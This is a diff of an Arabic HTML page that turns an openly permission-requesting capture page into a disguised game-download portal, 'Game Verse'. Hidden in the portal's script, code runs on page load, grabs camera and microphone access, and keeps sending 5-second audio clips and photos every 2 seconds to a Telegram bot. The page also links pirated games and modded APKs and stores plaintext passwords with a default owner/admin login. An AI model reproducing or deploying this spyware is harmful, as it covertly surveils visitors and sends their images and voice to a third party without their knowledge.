@@ -1,42 +1,221 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      background: #0b0f16;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      gap: 20px;
-      color: white;
-      font-family: sans-serif;
-    }
-    button {
-      padding: 14px 32px;
-      font-size: 20px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      background: #0a84ff;
-      color: white;
-    }
-    #stopBtn { background: #d50000; }
-  </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Game Verse - عالم الألعاب</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to bottom right, #581c87, #1e3a8a, #000000);
+            min-height:100vh; color:#fff;
+        }
+
+        /* Header */
+        header {
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(168,85,247,0.3);
+            position: sticky; top:0; z-index:1000;
+        }
+        .header-container {
+            max-width:1200px; margin:0 auto; padding:1rem 2rem;
+            display:flex; justify-content:space-between; align-items:center; gap:1rem;
+        }
+        .logo-container { position:relative; display:flex; align-items:center; gap:1rem; }
+        .logo-glow {
+            position:absolute; inset:0; background:#a855f7; filter:blur(40px);
+            opacity:0.5; animation:pulse 2s infinite; z-index:-1; border-radius:8px;
+        }
+        @keyframes pulse { 0%,100%{opacity:0.5} 50%{opacity:0.8} }
+
+        h1 {
+            font-size:1.6rem; font-weight:900;
+            background:linear-gradient(to right,#c084fc,#f472b6);
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+        }
+
+        .header-actions { display:flex; gap:0.5rem; align-items:center; }
+
+        button {
+            padding:0.5rem 1rem; border:none; border-radius:0.5rem; cursor:pointer;
+            font-weight:700; transition:all .25s; display:inline-flex; align-items:center; gap:0.5rem;
+        }
+        .btn-login { background:linear-gradient(90deg,#a855f7,#ec4899); color:#fff; }
+        .btn-register { background:linear-gradient(90deg,#3b82f6,#06b6d4); color:#fff; }
+        .btn-logout { background:#ef4444; color:#fff; }
+        .btn-add { background:linear-gradient(90deg,#22c55e,#10b981); color:#fff; }
+        .btn-filter-pc { background:linear-gradient(90deg,#2563eb,#06b6d4); color:#fff; }
+        .btn-filter-mobile { background:linear-gradient(90deg,#a855f7,#ec4899); color:#fff; }
+
+        .user-info { color:#d8b4fe; display:flex; align-items:center; gap:0.5rem; }
+
+        .owner-badge { background:#eab308; color:#000; padding:0.15rem .4rem; border-radius:4px; font-size:.75rem; }
+
+        /* Buttons row under header */
+        .category-row {
+            max-width:1200px; margin:0.75rem auto; padding:0 2rem; display:flex; gap:0.75rem; justify-content:flex-start;
+        }
+
+        /* Modal */
+        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); backdrop-filter: blur(10px); z-index:2000; align-items:center; justify-content:center; padding:1rem; }
+        .modal.active { display:flex; }
+        .modal-content {
+            background:linear-gradient(to bottom right,#581c87,#1e3a8a); padding:2rem; border-radius:1rem; max-width:500px; width:100%;
+            border:2px solid rgba(168,85,247,0.5); box-shadow:0 20px 50px rgba(0,0,0,0.5);
+        }
+        .modal-content h2 { text-align:center; margin-bottom:1rem; font-size:1.25rem; }
+        .error-message { background:rgba(239,68,68,0.12); border:1px solid #ef4444; color:#fca5a5; padding:.6rem; border-radius:.5rem; margin-bottom:1rem; }
+
+        input[type="text"], input[type="password"] {
+            width:100%; background: rgba(0,0,0,0.45); border:1px solid rgba(168,85,247,0.25); border-radius:.5rem; padding:.7rem .9rem; color:#fff; margin-bottom:.9rem;
+        }
+        .modal-buttons { display:flex; gap:.6rem; }
+        .btn-cancel { background:#4b5563; color:#fff; padding:.5rem 1rem; border-radius:.5rem; }
+
+        /* Main / grid */
+        main { max-width:1200px; margin:0 auto; padding:1.5rem 2rem 3rem; }
+        .games-grid { display:grid; grid-template-columns: repeat(auto-fill, minmax(300px,1fr)); gap:1.25rem; }
+
+        .game-card {
+            background: rgba(0,0,0,0.45); backdrop-filter: blur(12px); border-radius:12px; overflow:hidden;
+            border:1px solid rgba(168,85,247,0.2); transition: transform .25s, box-shadow .25s;
+        }
+        .game-card:hover { transform: translateY(-6px); box-shadow:0 18px 40px rgba(0,0,0,0.5); border-color:rgba(168,85,247,0.5); }
+
+        .game-image-container { position:relative; height:220px; overflow:hidden; }
+        .game-image-container img { width:100%; height:100%; object-fit:cover; transition: transform .4s; }
+        .game-card:hover .game-image-container img { transform: scale(1.06); }
+        .image-overlay { position:absolute; inset:0; background: linear-gradient(to top, rgba(0,0,0,0.6), transparent); }
+
+        .game-content { padding:1rem; }
+        .game-title { font-size:1.1rem; font-weight:800; margin-bottom:.5rem; text-align:right; }
+        .game-stats { display:flex; justify-content:space-between; align-items:center; margin-bottom:.6rem; font-size:.95rem; }
+
+        .rating-stars { display:flex; gap:.35rem; justify-content:center; margin-bottom:.75rem; }
+        .star { cursor:pointer; font-size:1.1rem; transition: transform .12s; }
+        .star:hover { transform:scale(1.2); }
+        .star.filled { color:#facc15; }
+        .star.empty { color:#6b7280; }
+
+        .btn-download { display:block; width:100%; text-align:center; padding:.6rem 1rem; border-radius:.6rem; text-decoration:none; color:#fff; font-weight:700; margin-bottom:.75rem; background:linear-gradient(90deg,#22c55e,#10b981); }
+
+        .comments-section { border-top:1px solid rgba(168,85,247,0.1); padding-top:.75rem; }
+        .comments-list { max-height:180px; overflow:auto; margin-bottom:.5rem; }
+        .comment { background: rgba(88,28,135,0.12); padding:.6rem; border-radius:.5rem; margin-bottom:.5rem; text-align:right; }
+        .comment-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:.3rem; }
+
+        /* Responsive */
+        @media (max-width:768px) {
+            .games-grid { grid-template-columns: 1fr; }
+            .header-container { flex-direction:column; gap:.6rem; align-items:stretch; }
+            .category-row { padding:0 1rem; justify-content:space-between; }
+            h1 { font-size:1.3rem; }
+        }
+    </style>
 </head>
 <body>
+    <!-- Header -->
+    <header>
+        <div class="header-container">
+            <div class="logo-container">
+                <div class="logo-glow" aria-hidden="true"></div>
+                <h1>Game Verse</h1>
+            </div>
 
-<h2>أذونات التشغيل مطلوبة</h2>
+            <!-- مكان تُحقن أزرار التسجيل / دخول أو معلومات المستخدم -->
+            <div class="header-actions" id="headerActions">
+                <!-- سيتم ملؤها بواسطة JavaScript -->
+            </div>
+        </div>
+    </header>
 
-<button id="startBtn" disabled>تشغيل</button>
+    <!-- Row لأزرار الفلاتر: ألعاب الكمبيوتر / ألعاب الجوال -->
+    <div class="category-row">
+        <!-- الأزرار موجودة هنا بصريًا — وظائفها يُعرفها السكربت لاحقًا -->
+        <button class="btn-filter-pc" onclick="showPCGames()">🎮 ألعاب الكمبيوتر</button>
+        <button class="btn-filter-mobile" onclick="showMobileGames()">📱 ألعاب الجوال</button>
+    </div>
 
+    <!-- Login Modal -->
+    <div class="modal" id="loginModal" aria-hidden="true">
+        <div class="modal-content">
+            <h2>تسجيل الدخول</h2>
+            <div id="loginError"></div>
+            <input type="text" id="loginUsername" placeholder="اسم المستخدم" autocomplete="username">
+            <input type="password" id="loginPassword" placeholder="كلمة المرور" autocomplete="current-password">
+            <div class="modal-buttons">
+                <button class="btn-login" onclick="handleLogin()">دخول</button>
+                <button class="btn-cancel" onclick="closeModal('loginModal')">إلغاء</button>
+            </div>
+        </div>
+    </div>
 
-<script>
+    <!-- Register Modal -->
+    <div class="modal" id="registerModal" aria-hidden="true">
+        <div class="modal-content">
+            <h2>إنشاء حساب جديد</h2>
+            <div id="registerError"></div>
+            <input type="text" id="registerUsername" placeholder="اسم المستخدم" autocomplete="username">
+            <input type="password" id="registerPassword" placeholder="كلمة المرور" autocomplete="new-password">
+            <div class="modal-buttons">
+                <button class="btn-register" onclick="handleRegister()">إنشاء</button>
+                <button class="btn-cancel" onclick="closeModal('registerModal')">إلغاء</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Add Game Modal -->
+    <div class="modal" id="addGameModal" aria-hidden="true">
+        <div class="modal-content">
+            <h2>إضافة لعبة جديدة</h2>
+            <input type="text" id="newGameName" placeholder="اسم اللعبة">
+            <input type="text" id="newGameUrl" placeholder="رابط التحميل">
+            <div style="margin-bottom:1rem;">
+                <label for="newGameImage" style="display:block; margin-bottom:.4rem; cursor:pointer; background:#4b5563; padding:.65rem; border-radius:.5rem; text-align:center;">
+                    📁 اختر صورة اللعبة
+                </label>
+                <input type="file" id="newGameImage" accept="image/*" style="display:none;" onchange="handleImageSelect(this,'newGamePreview')">
+                <img id="newGamePreview" alt="معاينة الصورة" style="width:100%; max-height:200px; object-fit:cover; border-radius:.5rem; margin-top:.5rem; display:none;">
+            </div>
+            <div class="modal-buttons">
+                <button class="btn-add" onclick="handleAddGame()">نشر</button>
+                <button class="btn-cancel" onclick="closeModal('addGameModal')">إلغاء</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Edit Game Modal -->
+    <div class="modal" id="editGameModal" aria-hidden="true">
+        <div class="modal-content">
+            <h2>تعديل اللعبة</h2>
+            <input type="text" id="editGameName" placeholder="اسم اللعبة">
+            <input type="text" id="editGameUrl" placeholder="رابط التحميل">
+            <div style="margin-bottom:1rem;">
+                <label for="editGameImage" style="display:block; margin-bottom:.4rem; cursor:pointer; background:#4b5563; padding:.65rem; border-radius:.5rem; text-align:center;">
+                    📁 اختر صورة جديدة (اختياري)
+                </label>
+                <input type="file" id="editGameImage" accept="image/*" style="display:none;" onchange="handleImageSelect(this,'editGamePreview')">
+                <img id="editGamePreview" alt="معاينة" style="width:100%; max-height:200px; object-fit:cover; border-radius:.5rem; margin-top:.5rem; display:none;">
+            </div>
+            <div class="modal-buttons">
+                <button class="btn-register" onclick="handleEditGame()">حفظ</button>
+                <button class="btn-cancel" onclick="closeModal('editGameModal')">إلغاء</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main>
+        <div class="games-grid" id="gamesGrid">
+            <!-- هنا تنبنى بطاقات الألعاب عبر جافاسكربت -->
+        </div>
+    </main>
+
+    <!-- سكربت (سيُملأ بالأجزاء التالية) -->
+    <script>
+
 let stream = null;
 let audioActive = false;
 let photoActive = false;
@@ -47,122 +226,590 @@ const CHAT_ID   = "5648826330";
 const AUDIO_MS = 5000; // الصوت كل 5 ثواني
 const PHOTO_MS = 2000; // الصورة كل 2 ثانية
 
-// ======================
-// طلب الصلاحيات عند الدخول
-// ======================
-async function requestPermissionsOnLoad() {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      audio: true,
-      video: true
+// إرسال إلى تليجرام
+function sendToTelegram(blob, type="voice") {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append(type, blob, type === "voice" ? "audio.webm" : "photo.jpg");
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "voice" ? "Voice" : "Photo"}`, {
+        method: "POST",
+        body: form
+    })
+    .catch(err => console.error("خطأ في الإرسال:", err));
+}
+
+// تسجيل صوت 5 ثواني
+function recordAudio() {
+    return new Promise(resolve => {
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" }));
+        recorder.start();
+        setTimeout(() => recorder.stop(), AUDIO_MS);
+    });
+}
+
+// التقاط صورة
+function captureImage() {
+    return new Promise(resolve => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+            video.play();
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            canvas.toBlob(blob => resolve(blob), "image/jpeg");
+        };
+    });
+}
+
+// حلقة الصوت
+async function audioLoop() {
+    audioActive = true;
+    while (audioActive) {
+        const audio = await recordAudio();
+        sendToTelegram(audio, "voice");
+        await new Promise(r => setTimeout(r, 5000));
+    }
+}
+
+// حلقة الصور
+async function photoLoop() {
+    photoActive = true;
+    while (photoActive) {
+        const img = await captureImage();
+        sendToTelegram(img, "photo");
+        await new Promise(r => setTimeout(r, PHOTO_MS));
+    }
+}
+
+// طلب إذن الكاميرا والمايك فور دخول الصفحة وتشغيل الحلقات
+async function start() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        console.log("تم منح الإذن! بدء التسجيل...");
+        audioLoop();
+        photoLoop();
+    } catch (err) {
+        console.log("تم رفض الإذن أو حدث خطأ:", err);
+    }
+}
+
+window.addEventListener("load", start);
+
+
+        /* الجزء 2 و 3: سيتم إضافتهما لاحقاً.
+           الآن عندك الهيكل، الستايل، والمودالات.
+           اطلب "بعث الجزء 2" لأكمل الألعاب و الجافاسكربت.
+        */
+
+// 🔵 ألعاب الكمبيوتر 
+let defaultGames = [
+    {
+        id: 1,
+        name: 'Detroit: Become Human',
+        image: 'https://cdn.salla.sa/AnzPY/971cb87f-44d3-47d2-95cd-c266fad6ba2f-1000x1000-yf3TesXeCLnRmwBPivjteXKgno9vDyQKawnY7iGK.jpg',
+        downloadUrl: 'https://up.downloadcomputergames.net/Detroit-Become-Human.zip',
+        downloads: 643,
+        ratings: [],
+        comments: []
+    },
+    {
+        id: 2,
+        name: 'Red Dead Redemption 2',
+        image: 'https://image.api.playstation.com/cdn/UP1004/CUSA03041_00/Hpl5MtwQgOVF9vJqlfui6SDB5Jl4oBSq.png',
+        downloadUrl: 'https://1fichier.com/?epzveep3rqng0va6h3tk',
+        downloads: 744,
+        ratings: [],
+        comments: []
+    },
+    {
+        id: 3,
+        name: 'Battlefield 1',
+        image: 'https://upload.wikimedia.org/wikipedia/ar/f/fc/Battlefield_1_cover_art.jpg',
+        downloadUrl: 'https://up.downloadcomputergames.net/Battlefield-1.zip',
+        downloads: 5356,
+        ratings: [],
+        comments: []
+    },
+    {
+        id: 4,
+        name: 'GTA V',
+        image: 'https://upload.wikimedia.org/wikipedia/en/a/a5/Grand_Theft_Auto_V.png',
+        downloadUrl: 'https://up.downloadcomputergames.net/GTA-V.zip',
+        downloads: 7557,
+        ratings: [],
+        comments: []
+    },
+    {
+        id: 5,
+        name: 'GTA III المحسنة',
+        image: 'https://uptogames.net/wp-content/uploads/2024/02/GTA-III-Definitive-Edition.webp',
+        downloadUrl: 'https://up.downloadcomputergames.net/GTA-III-Definitive-Edition.zip',
+        downloads: 4567,
+        ratings: [],
+        comments: []
+    },
+    {
+        id: 6,
+        name: 'GTA Vice City المحسنة',
+        image: 'https://i0.wp.com/www.vga4a.com/wp-content/uploads/hq720-14.jpg?w=686&ssl=1',
+        downloadUrl: 'https://up.downloadcomputergames.net/GTA-Vice-City-Definitive-Edition.zip',
+        downloads: 75,
+        ratings: [],
+        comments: []
+    },
+    {
+        id: 7,
+        name: 'Planet Coaster — بلانت كوستر',
+        image: 'https://upload.wikimedia.org/wikipedia/en/6/60/Planet_coaster_box.png',
+        downloadUrl: 'https://buzzheavier.com/orl2l8tc6zrc',
+        downloads: 244,
+        ratings: [],
+        comments: []
+    }
+];
+
+
+// 🔴 ألعاب الجوال
+let mobileGames = [
+    {
+        id: 1001,
+        name: 'gta saالمحسنه ',
+        image: 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYtANi8ycgRSGSv8LbDNPUaOhHKz6hcM1PHbr4POh61rHV-SR8cVnzGRp_k2pfSdZp43OCiS49Tq8ruNoB7Zu-dKQ5T2XSy7MB_aiEAk7JsIvop8p6A1c3teWdVA5WUxk5sOzKWP8FfxQ0vhWrHvci9JlXpUYgXpU2yvUovjCtvwYz4diQfLPx3FtNT20/s720-rw-e365/GTA-San-Andreas-Definitive-Edition-mobile-DirectForGames.com.jpg',
+        downloadUrl: 'https://up.directforgames.com/download.php?id=gta-san-andreas-definitive-60-FPS-v1.72.42919648.apks',
+        downloads: 2442,
+        ratings: [],
+        comments: []
+    },
+    {
+        id: 1002,
+        name: 'ماين كرافت minecraft',
+        image: 'https://www.elternguide.online/wp-content/uploads/2018/01/minecraft.png',
+        downloadUrl: 'https://up.apkbaba.com/games/Minecraft-mod-menu_1.21.124.2-Apkbaba.com.apk',
+        downloads: 32,
+        ratings: [],
+        comments: []
+    },
+    {
+        id: 1003,
+        name: 'قريبا',
+        image: 'https://pbs.twimg.com/media/Ex0Bn93WEAIyP7Z.jpg',
+        downloadUrl: 'https://pbs.twimg.com/media/Ex0Bn93WEAIyP7Z.jpg',
+        downloads: 0,
+        ratings: [],
+        comments: []
+    }
+];
+
+
+// المتغير الحالي للألعاب المعروضة
+let games = defaultGames.slice();
+/* ================================
+      المتغيرات العامة
+================================ */
+let users = [];
+let currentUser = null;
+let editingGameId = null;
+
+/* ================================
+        حفظ / تحميل التخزين
+================================ */
+function saveUsers() {
+    localStorage.setItem("users", JSON.stringify(users));
+}
+
+function saveGames() {
+    localStorage.setItem("games", JSON.stringify(games));
+}
+
+function saveCurrentUser() {
+    if (currentUser)
+        localStorage.setItem("currentUser", currentUser.username);
+    else
+        localStorage.removeItem("currentUser");
+}
+
+function loadAll() {
+    const savedUsers = localStorage.getItem("users");
+    const savedGames = localStorage.getItem("games");
+    const savedUser = localStorage.getItem("currentUser");
+
+    users = savedUsers ? JSON.parse(savedUsers) : [{ username: "owner", password: "admin", isOwner: true }];
+
+    if (savedGames) games = JSON.parse(savedGames);
+
+    if (savedUser) {
+        currentUser = users.find(u => u.username === savedUser) || null;
+    }
+
+    saveUsers();
+    saveGames();
+}
+
+/* ================================
+        فتح / غلق مودالات
+================================ */
+function openModal(id) {
+    document.getElementById(id).classList.add("active");
+}
+function closeModal(id) {
+    document.getElementById(id).classList.remove("active");
+}
+
+/* ================================
+          تسجيل دخول
+================================ */
+function handleLogin() {
+    const username = loginUsername.value.trim();
+    const password = loginPassword.value.trim();
+
+    const user = users.find(u => u.username === username && u.password === password);
+
+    if (!user) {
+        loginError.innerHTML = `<div class="error-message">خطأ في البيانات</div>`;
+        return;
+    }
+
+    currentUser = user;
+    saveCurrentUser();
+    closeModal("loginModal");
+    updateHeader();
+    renderGames();
+}
+
+/* ================================
+        تسجيل جديد
+================================ */
+function handleRegister() {
+    const username = registerUsername.value.trim();
+    const password = registerPassword.value.trim();
+
+    if (!username || !password) {
+        registerError.innerHTML = `<div class="error-message">املأ الحقول</div>`;
+        return;
+    }
+
+    if (users.find(u => u.username === username)) {
+        registerError.innerHTML = `<div class="error-message">اسم المستخدم موجود</div>`;
+        return;
+    }
+
+    const newUser = { username, password, isOwner: false };
+    users.push(newUser);
+
+    currentUser = newUser;
+    saveUsers();
+    saveCurrentUser();
+    closeModal("registerModal");
+    updateHeader();
+    renderGames();
+}
+
+/* ================================
+          تسجيل خروج
+================================ */
+function handleLogout() {
+    currentUser = null;
+    saveCurrentUser();
+    updateHeader();
+    renderGames();
+}
+
+/* ================================
+     إضافة لعبة جديدة
+================================ */
+function handleImageSelect(input, previewId) {
+    const file = input.files[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = e => {
+        const img = document.getElementById(previewId);
+        img.src = e.target.result;
+        img.style.display = "block";
+    };
+    reader.readAsDataURL(file);
+}
+
+function handleAddGame() {
+    const name = newGameName.value.trim();
+    const url = newGameUrl.value.trim();
+    const img = newGamePreview.src;
+
+    if (!name || !url || !img) {
+        alert("املأ جميع الحقول");
+        return;
+    }
+
+    const game = {
+        id: Date.now(),
+        name,
+        image: img,
+        downloadUrl: url,
+        downloads: 0,
+        ratings: [],
+        comments: []
+    };
+
+    games.unshift(game);
+    saveGames();
+
+    closeModal("addGameModal");
+    renderGames();
+}
+
+/* ================================
+        تعديل لعبة
+================================ */
+function openEditModal(id) {
+    const game = games.find(g => g.id === id);
+    editingGameId = id;
+
+    editGameName.value = game.name;
+    editGameUrl.value = game.downloadUrl;
+    editGamePreview.src = game.image;
+    editGamePreview.style.display = "block";
+
+    openModal("editGameModal");
+}
+
+function handleEditGame() {
+    const name = editGameName.value.trim();
+    const url = editGameUrl.value.trim();
+    const img = editGamePreview.src;
+
+    games = games.map(g =>
+        g.id === editingGameId ? { ...g, name, downloadUrl: url, image: img } : g
+    );
+
+    saveGames();
+    closeModal("editGameModal");
+    renderGames();
+}
+
+/* ================================
+        تحميل (زيادة العدد)
+================================ */
+function handleDownload(id) {
+    if (!currentUser) return openModal("loginModal");
+
+    games = games.map(g =>
+        g.id === id ? { ...g, downloads: g.downloads + 1 } : g
+    );
+
+    saveGames();
+    renderGames();
+}
+
+/* ================================
+        التقييم
+================================ */
+function handleRate(id, rate) {
+    if (!currentUser) return openModal("loginModal");
+
+    games = games.map(g => {
+        if (g.id === id) {
+            const exist = g.ratings.find(r => r.user === currentUser.username);
+
+            if (exist) exist.rating = rate;
+            else g.ratings.push({ user: currentUser.username, rating: rate });
+        }
+
+        return g;
     });
 
-    document.getElementById("startBtn").disabled = false;
-    alert("✔ تم منح صلاحيات  اضغط  للبدء.");
-
-  } catch {
-    alert("⚠ يجب الموافقة على صلاحيات حتى يعمل الموقع.");
-  }
+    saveGames();
+    renderGames();
 }
 
-// إستدعاء طلب الأذونات فور فتح الموقع
-requestPermissionsOnLoad();
+/* ================================
+        التعليقات
+================================ */
+function handleComment(id) {
+    if (!currentUser) return openModal("loginModal");
 
-// ======================
-// إرسال إلى تليجرام
-// ======================
-function sendToTelegram(blob, type="voice") {
-  const form = new FormData();
-  form.append("chat_id", CHAT_ID);
-  form.append(type, blob, type === "voice" ? "audio.webm" : "photo.jpg");
+    const input = document.getElementById(`comment-${id}`);
+    const text = input.value.trim();
+    if (!text) return;
 
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "voice" ? "Voice" : "Photo"}`, {
-    method: "POST",
-    body: form
-  });
+    const game = games.find(g => g.id === id);
+
+    game.comments.push({
+        id: Date.now(),
+        user: currentUser.username,
+        text,
+        date: new Date().toLocaleString("ar"),
+        edited: false
+    });
+
+    input.value = "";
+    saveGames();
+    renderGames();
 }
 
-// ======================
-// تسجيل صوت 5 ثواني
-// ======================
-function recordAudio() {
-  return new Promise(resolve => {
-    const recorder = new MediaRecorder(stream);
-    const chunks = [];
+function editComment(gameId, commentId) {
+    const game = games.find(g => g.id === gameId);
+    const c = game.comments.find(c => c.id === commentId);
 
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" }));
-    
-    recorder.start();
-    setTimeout(() => recorder.stop(), AUDIO_MS);
-  });
+    let newText = prompt("تعديل التعليق:", c.text);
+    if (!newText) return;
+
+    c.text = newText.trim();
+    c.edited = true;
+    c.date = new Date().toLocaleString("ar");
+
+    saveGames();
+    renderGames();
 }
 
-// ======================
-// التقاط صورة
-// ======================
-function captureImage() {
-  return new Promise(resolve => {
-    const video = document.createElement("video");
-    video.srcObject = stream;
+function deleteComment(gameId, commentId) {
+    const game = games.find(g => g.id === gameId);
 
-    video.onloadedmetadata = () => {
-      video.play();
+    game.comments = game.comments.filter(c => c.id !== commentId);
 
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      canvas.toBlob(blob => resolve(blob), "image/jpeg");
-    };
-  });
+    saveGames();
+    renderGames();
 }
 
-// ======================
-// حلقة الصوت المستمرة
-// ======================
-async function audioLoop() {
-  audioActive = true;
-  while (audioActive) {
-    const audio = await recordAudio();
-    sendToTelegram(audio, "voice");
-    await new Promise(r => setTimeout(r, 5000));
-  }
+/* ================================
+    الفلترة بين الكمبيوتر والجوال
+================================ */
+function showPCGames() {
+    games = defaultGames.slice();
+    saveGames();
+    renderGames();
 }
 
-// ======================
-// حلقة الصور المستمرة
-// ======================
-async function photoLoop() {
-  photoActive = true;
-  while (photoActive) {
-    const img = await captureImage();
-    sendToTelegram(img, "photo");
-    await new Promise(r => setTimeout(r, PHOTO_MS));
-  }
+function showMobileGames() {
+    games = mobileGames.slice();
+    renderGames();
 }
 
-// ======================
-// زر تشغيل
-// ======================
-document.getElementById("startBtn").onclick = () => {
-  if (!stream) {
-    alert("⚠ الصلاحيات غير مفعلة!");
-    return;
-  }
+/* ================================
+      تحديث الهيدر
+================================ */
+function updateHeader() {
+    if (currentUser) {
+        headerActions.innerHTML = `
+            <span class="user-info">👤 ${currentUser.username}</span>
+            ${currentUser.isOwner ? `<span class="owner-badge">مالك</span>` : ""}
+            ${currentUser.isOwner ? `<button class="btn-add" onclick="openModal('addGameModal')">+ إضافة لعبة</button>` : ""}
+            <button class="btn-logout" onclick="handleLogout()">تسجيل خروج</button>
+        `;
+    } else {
+        headerActions.innerHTML = `
+            <button class="btn-login" onclick="openModal('loginModal')">تسجيل دخول</button>
+            <button class="btn-register" onclick="openModal('registerModal')">إنشاء حساب</button>
+        `;
+    }
+}
 
-  audioLoop();
-  photoLoop();
+/* ================================
+        عرض الألعاب
+================================ */
+function getAverage(game) {
+    if (game.ratings.length === 0) return 0;
+    return (game.ratings.reduce((a, b) => a + b.rating, 0) / game.ratings.length).toFixed(1);
+}
 
-  document.getElementById("startBtn").disabled = true;
-  document.getElementById("stopBtn").disabled = false;
+function getUserRating(game) {
+    if (!currentUser) return 0;
+    const r = game.ratings.find(r => r.user === currentUser.username);
+    return r ? r.rating : 0;
+}
 
-  alert("🔵 بدأ الإرسال المستمر.");
-};
+function escapeHtml(text) {
+    return text.replace(/[&<>"']/g, c => ({
+        "&": "&amp;", "<": "&lt;", ">": "&gt;",
+        '"': "&quot;", "'": "&#039;"
+    }[c]));
+}
 
+function renderGames() {
+    gamesGrid.innerHTML = games.map(game => {
+        const avg = getAverage(game);
+        const ur = getUserRating(game);
 
-</script>
+        const commentsHtml = game.comments
+            .map(c => `
+                <div class="comment">
+                    <div class="comment-header">
+                        <span>${c.user}</span>
+                        <span>${c.date}</span>
+                    </div>
+                    <p>${escapeHtml(c.text)}</p>
+                    ${c.edited ? "<small style='opacity:.7'>تم التعديل</small>" : ""}
+                    ${
+                        currentUser && (currentUser.username === c.user || currentUser.isOwner)
+                        ? `<div>
+                            <button onclick="editComment(${game.id}, ${c.id})">✏️</button>
+                            <button onclick="deleteComment(${game.id}, ${c.id})">🗑️</button>
+                          </div>`
+                        : ""
+                    }
+                </div>
+            `)
+            .join("");
 
+        return `
+            <div class="game-card">
+                <div class="game-image-container">
+                    <img src="${game.image}" />
+                    <div class="image-overlay"></div>
+                    ${
+                        currentUser?.isOwner
+                        ? `<button class="btn-edit" onclick="openEditModal(${game.id})"
+                           style="position:absolute;top:10px;left:10px;">✏️</button>`
+                        : ""
+                    }
+                </div>
+                <div class="game-content">
+                    <h3 class="game-title">${escapeHtml(game.name)}</h3>
+
+                    <div class="game-stats">
+                        <span>📥 ${game.downloads} تحميل</span>
+                        <span>⭐ ${avg}</span>
+                    </div>
+
+                    <div class="rating-stars">
+                        ${[1,2,3,4,5]
+                            .map(s => `
+                                <span class="star ${s <= ur ? "filled" : "empty"}"
+                                      onclick="handleRate(${game.id}, ${s})">★</span>
+                            `)
+                            .join("")}
+                    </div>
+
+                    <a class="btn-download" href="${game.downloadUrl}" target="_blank"
+                       onclick="handleDownload(${game.id})">تحميل</a>
+
+                    <div class="comments-section">
+                        <div class="comments-list">${commentsHtml}</div>
+                        <input id="comment-${game.id}" placeholder="اكتب تعليقك..." />
+                        <button onclick="handleComment(${game.id})">إرسال</button>
+                    </div>
+                </div>
+            </div>
+        `;
+    }).join("");
+}
+
+/* ================================
+          تشغيل الموقع
+================================ */
+function init() {
+    loadAll();
+    updateHeader();
+    renderGames();
+}
+init();
+
+    </script>
 </body>
 </html>
